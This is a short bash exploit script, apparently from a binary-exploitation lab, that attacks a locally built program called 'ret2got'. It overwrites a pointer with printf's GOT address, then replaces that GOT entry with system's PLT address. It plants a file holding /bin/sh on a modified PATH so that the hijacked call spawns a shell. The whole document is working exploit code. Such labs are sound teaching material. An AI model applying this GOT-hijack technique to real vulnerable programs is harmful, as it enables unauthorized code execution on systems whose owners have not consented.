#!/bin/bash

# Address of the GOT entry of printf and the PLT entry of system
printf_got_addr=0x0804c00c
system_plt_addr=0x080490a0

# Make sure the executable is built
make ret2got

# Set up the shell script to call
echo /bin/sh > Array
chmod 777 Array
export PATH=.:$PATH

# Execute the actual exploit (overwrite pointer with GOT address of printf, then overwrite GOT entry of printf with PLT entry of system)
./ret2got "$(python -c "from struct import pack; print('A' * 8 + pack('<L', $(echo $printf_got_addr)))")" "$(python -c "from struct import pack; print(pack('<L', $(echo $system_plt_addr)))")"

# Clean up
rm Array
